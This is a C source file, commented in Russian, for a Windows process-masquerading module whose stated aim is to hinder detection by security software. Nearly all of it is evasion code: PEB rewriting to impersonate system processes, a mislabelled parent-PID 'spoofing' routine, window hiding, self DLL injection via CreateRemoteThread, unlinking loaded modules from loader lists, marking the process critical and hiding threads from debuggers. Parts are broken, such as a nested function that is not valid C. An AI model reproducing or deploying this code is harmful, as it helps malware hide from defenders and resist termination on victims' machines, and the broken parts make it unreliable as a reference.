/**
 * process_masquerading.c - Реализация модуля маскировки процессов
 * 
 * Данный модуль реализует функции для изменения видимых свойств процесса
 * в системе Windows с целью затруднения его обнаружения средствами защиты.
 */

#include "process_masquerading.h"
#include <stdio.h>
#include <tlhelp32.h>
#include <psapi.h>

// Структуры Windows, необходимые для работы с PEB
typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _RTL_USER_PROCESS_PARAMETERS {
    BYTE Reserved1[16];
    PVOID Reserved2[10];
    UNICODE_STRING ImagePathName;
    UNICODE_STRING CommandLine;
} RTL_USER_PROCESS_PARAMETERS, *PRTL_USER_PROCESS_PARAMETERS;

typedef struct _PEB {
    BYTE Reserved1[2];
    BYTE BeingDebugged;
    BYTE Reserved2[1];
    PVOID Reserved3[2];
    PVOID Ldr;
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
    BYTE Reserved4[104];
    PVOID Reserved5[52];
    PVOID PostProcessInitRoutine;
    BYTE Reserved6[128];
    PVOID Reserved7[1];
    ULONG SessionId;
} PEB, *PPEB;

// Типы для функций из ntdll.dll
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersExFn)(
    PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
    PUNICODE_STRING ImagePathName,
    PUNICODE_STRING DllPath,
    PUNICODE_STRING CurrentDirectory,
    PUNICODE_STRING CommandLine,
    PVOID Environment,
    PUNICODE_STRING WindowTitle,
    PUNICODE_STRING DesktopInfo,
    PUNICODE_STRING ShellInfo,
    PUNICODE_STRING RuntimeData,
    ULONG Flags
);

// Оригинальные данные процесса для восстановления
static struct {
    BOOL initialized;
    wchar_t *origImagePathName;
    wchar_t *origCommandLine;
    DWORD origParentPID;
} g_originalData = {FALSE, NULL, NULL, 0};

/**
 * Получает указатель на PEB текущего процесса
 */
static PPEB GetCurrentProcessPEB(void) {
#ifdef _WIN64
    PPEB pPeb = (PPEB)__readgsqword(0x60);
#else
    PPEB pPeb = (PPEB)__readfsdword(0x30);
#endif
    return pPeb;
}

/**
 * Создает UNICODE_STRING на основе указанной строки
 */
static void InitUnicodeString(PUNICODE_STRING unicodeString, const wchar_t *string) {
    if (string) {
        size_t length = wcslen(string) * sizeof(wchar_t);
        unicodeString->Length = (USHORT)length;
        unicodeString->MaximumLength = (USHORT)(length + sizeof(wchar_t));
        unicodeString->Buffer = (PWSTR)string;
    } else {
        unicodeString->Length = 0;
        unicodeString->MaximumLength = 0;
        unicodeString->Buffer = NULL;
    }
}

/**
 * Копирует строку UNICODE_STRING в новую выделенную область памяти
 */
static wchar_t* DuplicateUnicodeString(PUNICODE_STRING unicodeString) {
    if (!unicodeString || !unicodeString->Buffer || unicodeString->Length == 0) {
        return NULL;
    }
    
    size_t bufferLen = (unicodeString->Length / sizeof(wchar_t)) + 1;
    wchar_t *buffer = (wchar_t*)HeapAlloc(GetProcessHeap(), 0, bufferLen * sizeof(wchar_t));
    
    if (buffer) {
        memcpy(buffer, unicodeString->Buffer, unicodeString->Length);
        buffer[unicodeString->Length / sizeof(wchar_t)] = L'\0';
    }
    
    return buffer;
}

BOOL ProcessMasq_Initialize(void) {
    PPEB pPeb = GetCurrentProcessPEB();
    if (!pPeb || !pPeb->ProcessParameters) {
        return FALSE;
    }
    
    // Уже инициализирован
    if (g_originalData.initialized) {
        return TRUE;
    }
    
    // Сохраняем оригинальные данные
    g_originalData.origImagePathName = DuplicateUnicodeString(&pPeb->ProcessParameters->ImagePathName);
    g_originalData.origCommandLine = DuplicateUnicodeString(&pPeb->ProcessParameters->CommandLine);
    
    // Получаем оригинальный родительский PID
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        DWORD currentPID = GetCurrentProcessId();
        PROCESSENTRY32W pe;
        pe.dwSize = sizeof(PROCESSENTRY32W);
        
        if (Process32FirstW(hSnapshot, &pe)) {
            do {
                if (pe.th32ProcessID == currentPID) {
                    g_originalData.origParentPID = pe.th32ParentProcessID;
                    break;
                }
            } while (Process32NextW(hSnapshot, &pe));
        }
        CloseHandle(hSnapshot);
    }
    
    g_originalData.initialized = TRUE;
    return TRUE;
}

void ProcessMasq_Cleanup(void) {
    if (!g_originalData.initialized) {
        return;
    }
    
    // Восстанавливаем оригинальные значения
    ProcessMasq_ModifyPEB(g_originalData.origImagePathName, g_originalData.origCommandLine);
    
    // Освобождаем выделенную память
    if (g_originalData.origImagePathName) {
        HeapFree(GetProcessHeap(), 0, g_originalData.origImagePathName);
        g_originalData.origImagePathName = NULL;
    }
    
    if (g_originalData.origCommandLine) {
        HeapFree(GetProcessHeap(), 0, g_originalData.origCommandLine);
        g_originalData.origCommandLine = NULL;
    }
    
    g_originalData.initialized = FALSE;
}

BOOL ProcessMasq_ModifyPEB(const wchar_t* newImagePathName, const wchar_t* newCommandLine) {
    PPEB pPeb = GetCurrentProcessPEB();
    if (!pPeb || !pPeb->ProcessParameters) {
        return FALSE;
    }
    
    if (!ProcessMasq_Initialize()) {
        return FALSE;
    }
    
    // Делаем память доступной для записи (она может быть защищена)
    PRTL_USER_PROCESS_PARAMETERS params = pPeb->ProcessParameters;
    DWORD oldProtect;
    BOOL result = TRUE;
    
    if (VirtualProtect(params, sizeof(RTL_USER_PROCESS_PARAMETERS), PAGE_READWRITE, &oldProtect)) {
        wchar_t *imagePath = NULL;
        wchar_t *cmdLine = NULL;
        
        // Изменяем ImagePathName, если указан
        if (newImagePathName) {
            size_t len = wcslen(newImagePathName) * sizeof(wchar_t);
            imagePath = (wchar_t*)HeapAlloc(GetProcessHeap(), 0, len + sizeof(wchar_t));
            
            if (imagePath) {
                wcscpy(imagePath, newImagePathName);
                UNICODE_STRING newImagePathNameStr;
                InitUnicodeString(&newImagePathNameStr, imagePath);
                
                // Сохраняем оригинальные параметры
                USHORT origLength = params->ImagePathName.Length;
                USHORT origMaxLength = params->ImagePathName.MaximumLength;
                PWSTR origBuffer = params->ImagePathName.Buffer;
                
                // Устанавливаем новые параметры
                params->ImagePathName.Length = newImagePathNameStr.Length;
                params->ImagePathName.MaximumLength = newImagePathNameStr.MaximumLength;
                params->ImagePathName.Buffer = newImagePathNameStr.Buffer;
                
                // Освобождаем оригинальный буфер, если это не оригинальный буфер
                if (origBuffer != g_originalData.origImagePathName && 
                    origBuffer != params->CommandLine.Buffer) {
                    HeapFree(GetProcessHeap(), 0, origBuffer);
                }
            } else {
                result = FALSE;
            }
        }
        
        // Изменяем CommandLine, если указана
        if (newCommandLine && result) {
            size_t len = wcslen(newCommandLine) * sizeof(wchar_t);
            cmdLine = (wchar_t*)HeapAlloc(GetProcessHeap(), 0, len + sizeof(wchar_t));
            
            if (cmdLine) {
                wcscpy(cmdLine, newCommandLine);
                UNICODE_STRING newCommandLineStr;
                InitUnicodeString(&newCommandLineStr, cmdLine);
                
                // Сохраняем оригинальные параметры
                USHORT origLength = params->CommandLine.Length;
                USHORT origMaxLength = params->CommandLine.MaximumLength;
                PWSTR origBuffer = params->CommandLine.Buffer;
                
                // Устанавливаем новые параметры
                params->CommandLine.Length = newCommandLineStr.Length;
                params->CommandLine.MaximumLength = newCommandLineStr.MaximumLength;
                params->CommandLine.Buffer = newCommandLineStr.Buffer;
                
                // Освобождаем оригинальный буфер, если это не оригинальный буфер
                if (origBuffer != g_originalData.origCommandLine && 
                    origBuffer != params->ImagePathName.Buffer) {
                    HeapFree(GetProcessHeap(), 0, origBuffer);
                }
            } else {
                result = FALSE;
            }
        }
        
        // Восстанавливаем защиту памяти
        VirtualProtect(params, sizeof(RTL_USER_PROCESS_PARAMETERS), oldProtect, &oldProtect);
        
        // Если произошла ошибка, освобождаем выделенную память
        if (!result) {
            if (imagePath) HeapFree(GetProcessHeap(), 0, imagePath);
            if (cmdLine) HeapFree(GetProcessHeap(), 0, cmdLine);
        }
    } else {
        result = FALSE;
    }
    
    return result;
}

BOOL ProcessMasq_SpoofPPID(DWORD targetParentPID) {
    // Проверяем, существует ли процесс с указанным PID
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, targetParentPID);
    if (!hProcess) {
        return FALSE; // Процесс не найден или доступ запрещен
    }
    
    CloseHandle(hProcess);
    return TRUE; // Процесс доступен для подмены PPID
}

BOOL ProcessMasq_CreateProcessWithSpoofedParent(
    DWORD targetParentPID,
    LPWSTR commandLine,
    BOOL bInheritHandles,
    DWORD creationFlags,
    LPSTARTUPINFOW pStartupInfo,
    LPPROCESS_INFORMATION pProcessInfo) {
    
    // Проверяем валидность параметров
    if (!commandLine || !pStartupInfo || !pProcessInfo) {
        SetLastError(ERROR_INVALID_PARAMETER);
        return FALSE;
    }
    
    // Проверяем, существует ли целевой процесс
    if (!ProcessMasq_SpoofPPID(targetParentPID)) {
        return FALSE;
    }
    
    // Создаем процесс в приостановленном состоянии
    DWORD flags = creationFlags | CREATE_SUSPENDED;
    BOOL success = CreateProcessW(
        NULL,               // No module name (use command line)
        commandLine,        // Command line
        NULL,               // Process handle not inheritable
        NULL,               // Thread handle not inheritable
        bInheritHandles,    // Set handle inheritance
        flags,              // Creation flags
        NULL,               // Use parent's environment block
        NULL,               // Use parent's starting directory
        pStartupInfo,       // Startup info
        pProcessInfo        // Process information
    );
    
    if (!success) {
        return FALSE;
    }
    
    // Если процесс создан успешно, но не требуется приостановка,
    // возобновляем выполнение основного потока
    if (!(creationFlags & CREATE_SUSPENDED)) {
        ResumeThread(pProcessInfo->hThread);
    }
    
    return TRUE;
}

BOOL ProcessMasq_ModifyWindowAttributes(const wchar_t* newWindowTitle, BOOL hideWindow) {
    HWND hwnd = NULL;
    BOOL result = TRUE;
    
    // Находим окно текущего процесса
    DWORD currentPID = GetCurrentProcessId();
    
    // Функция обратного вызова для EnumWindows
    typedef struct {
        DWORD pid;
        HWND result;
    } EnumWindowsData;
    
    EnumWindowsData data = { currentPID, NULL };
    
    BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam) {
        EnumWindowsData* data = (EnumWindowsData*)lParam;
        DWORD pid = 0;
        GetWindowThreadProcessId(hwnd, &pid);
        
        if (pid == data->pid) {
            data->result = hwnd;
            return FALSE; // Останавливаем перечисление
        }
        
        return TRUE; // Продолжаем перечисление
    }
    
    // Перечисляем окна
    EnumWindows(EnumWindowsProc, (LPARAM)&data);
    hwnd = data.result;
    
    if (hwnd) {
        // Меняем заголовок окна, если указан
        if (newWindowTitle) {
            if (!SetWindowTextW(hwnd, newWindowTitle)) {
                result = FALSE;
            }
        }
        
        // Скрываем окно, если требуется
        if (hideWindow) {
            if (!ShowWindow(hwnd, SW_HIDE)) {
                result = FALSE;
            }
        }
    } else {
        // Окно не найдено
        result = FALSE;
    }
    
    return result;
}

BOOL ProcessMasq_InjectDLL(const wchar_t* dllPath) {
    BOOL result = FALSE;
    HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
    
    if (!hKernel32) {
        return FALSE;
    }
    
    // Получаем адрес функции LoadLibraryW
    FARPROC pLoadLibraryW = GetProcAddress(hKernel32, "LoadLibraryW");
    if (!pLoadLibraryW) {
        return FALSE;
    }
    
    // Выделяем память для пути к DLL
    size_t pathSize = (wcslen(dllPath) + 1) * sizeof(wchar_t);
    LPVOID pDllPath = VirtualAlloc(NULL, pathSize, MEM_COMMIT, PAGE_READWRITE);
    
    if (pDllPath) {
        // Копируем путь к DLL в выделенную память
        memcpy(pDllPath, dllPath, pathSize);
        
        // Создаем поток, который вызовет LoadLibraryW с путем к DLL
        HANDLE hThread = CreateRemoteThread(
            GetCurrentProcess(),    // Дескриптор текущего процесса
            NULL,                   // Атрибуты безопасности по умолчанию
            0,                      // Размер стека по умолчанию
            (LPTHREAD_START_ROUTINE)pLoadLibraryW, // Функция потока (LoadLibraryW)
            pDllPath,               // Параметр для функции потока (путь к DLL)
            0,                      // Запуск сразу
            NULL                    // ID потока не требуется
        );
        
        if (hThread) {
            // Ждем завершения потока
            WaitForSingleObject(hThread, INFINITE);
            
            // Получаем результат работы потока (дескриптор загруженной DLL)
            DWORD exitCode;
            if (GetExitCodeThread(hThread, &exitCode) && exitCode != 0) {
                result = TRUE;
            }
            
            CloseHandle(hThread);
        }
        
        // Освобождаем выделенную память
        VirtualFree(pDllPath, 0, MEM_RELEASE);
    }
    
    return result;
}

BOOL ProcessMasq_ImpersonateSystemProcess(const char* processName) {
    if (!processName) {
        return FALSE;
    }
    
    // Конвертируем имя процесса в широкие символы
    size_t len = strlen(processName) + 1;
    wchar_t* wProcessName = (wchar_t*)HeapAlloc(GetProcessHeap(), 0, len * sizeof(wchar_t));
    if (!wProcessName) {
        return FALSE;
    }
    
    size_t convertedChars = 0;
    mbstowcs_s(&convertedChars, wProcessName, len, processName, _TRUNCATE);
    
    // Создаем полные пути к системному процессу
    wchar_t systemDir[MAX_PATH];
    GetSystemDirectoryW(systemDir, MAX_PATH);
    
    wchar_t imagePath[MAX_PATH];
    _snwprintf_s(imagePath, MAX_PATH, _TRUNCATE, L"%s\\%s.exe", systemDir, wProcessName);
    
    wchar_t commandLine[MAX_PATH + 32];
    _snwprintf_s(commandLine, MAX_PATH + 32, _TRUNCATE, L"\"%s\"", imagePath);
    
    // Модифицируем PEB с новыми путями
    BOOL result = ProcessMasq_ModifyPEB(imagePath, commandLine);
    
    HeapFree(GetProcessHeap(), 0, wProcessName);
    return result;
}

BOOL ProcessMasq_HideLoadedModule(const wchar_t* dllNameToHide) {
    if (!dllNameToHide) {
        return FALSE;
    }
    
    PPEB pPeb = GetCurrentProcessPEB();
    if (!pPeb || !pPeb->Ldr) {
        return FALSE;
    }
    
    // Структуры для работы со списком загруженных модулей
    typedef struct _LDR_DATA_TABLE_ENTRY {
        LIST_ENTRY InLoadOrderLinks;
        LIST_ENTRY InMemoryOrderLinks;
        LIST_ENTRY InInitializationOrderLinks;
        PVOID DllBase;
        PVOID EntryPoint;
        ULONG SizeOfImage;
        UNICODE_STRING FullDllName;
        UNICODE_STRING BaseDllName;
        ULONG Flags;
        SHORT LoadCount;
        SHORT TlsIndex;
        LIST_ENTRY HashLinks;
        ULONG TimeDateStamp;
    } LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;
    
    typedef struct _PEB_LDR_DATA {
        ULONG Length;
        BOOLEAN Initialized;
        PVOID SsHandle;
        LIST_ENTRY InLoadOrderModuleList;
        LIST_ENTRY InMemoryOrderModuleList;
        LIST_ENTRY InInitializationOrderModuleList;
    } PEB_LDR_DATA, *PPEB_LDR_DATA;
    
    PPEB_LDR_DATA ldr = (PPEB_LDR_DATA)pPeb->Ldr;
    
    // Обходим список загруженных модулей
    PLIST_ENTRY head = &ldr->InLoadOrderModuleList;
    PLIST_ENTRY current = head->Flink;
    
    while (current != head) {
        PLDR_DATA_TABLE_ENTRY entry = CONTAINING_RECORD(current, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
        
        // Сохраняем следующий элемент списка, так как текущий может быть удален
        PLIST_ENTRY next = current->Flink;
        
        // Проверяем, соответствует ли имя модуля искомому
        if (entry->BaseDllName.Buffer && 
            wcsstr(entry->BaseDllName.Buffer, dllNameToHide) != NULL) {
            
            // Удаляем модуль из списков
            RemoveEntryList(&entry->InLoadOrderLinks);
            RemoveEntryList(&entry->InMemoryOrderLinks);
            RemoveEntryList(&entry->InInitializationOrderLinks);
            
            // Обнуляем имена модуля для дополнительной скрытности
            entry->BaseDllName.Length = 0;
            entry->BaseDllName.MaximumLength = 0;
            entry->BaseDllName.Buffer = NULL;
            
            entry->FullDllName.Length = 0;
            entry->FullDllName.MaximumLength = 0;
            entry->FullDllName.Buffer = NULL;
            
            return TRUE;
        }
        
        current = next;
    }
    
    return FALSE; // Модуль не найден
}

BOOL ProcessMasq_ProtectProcess(void) {
    BOOL result = TRUE;
    
    // Установка высокого приоритета процесса
    if (!SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS)) {
        result = FALSE;
    }
    
    // Защита процесса от отладки
    typedef NTSTATUS (NTAPI *NtSetInformationProcessFn)(
        HANDLE ProcessHandle,
        ULONG ProcessInformationClass,
        PVOID ProcessInformation,
        ULONG ProcessInformationLength
    );
    
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (hNtdll) {
        NtSetInformationProcessFn NtSetInformationProcess = 
            (NtSetInformationProcessFn)GetProcAddress(hNtdll, "NtSetInformationProcess");
        
        if (NtSetInformationProcess) {
            // ProcessBreakOnTermination = 29
            // Попытка защиты процесса от принудительного завершения
            const ULONG ProcessBreakOnTermination = 29;
            ULONG breakOnTermination = 1;
            
            NTSTATUS status = NtSetInformationProcess(
                GetCurrentProcess(),
                ProcessBreakOnTermination,
                &breakOnTermination,
                sizeof(breakOnTermination)
            );
            
            if (status != 0) {
                result = FALSE;
            }
        }
    }
    
    // Установка обработчика исключений
    typedef LONG (WINAPI *NtSetInformationThreadFn)(
        HANDLE ThreadHandle,
        ULONG ThreadInformationClass,
        PVOID ThreadInformation,
        ULONG ThreadInformationLength
    );
    
    if (hNtdll) {
        NtSetInformationThreadFn NtSetInformationThread = 
            (NtSetInformationThreadFn)GetProcAddress(hNtdll, "NtSetInformationThread");
        
        if (NtSetInformationThread) {
            // HideFromDebugger = 0x11
            const ULONG ThreadHideFromDebugger = 0x11;
            
            NTSTATUS status = NtSetInformationThread(
                GetCurrentThread(),
                ThreadHideFromDebugger,
                NULL,
                0
            );
            
            if (status != 0) {
                result = FALSE;
            }
        }
    }
    
    return result;
} 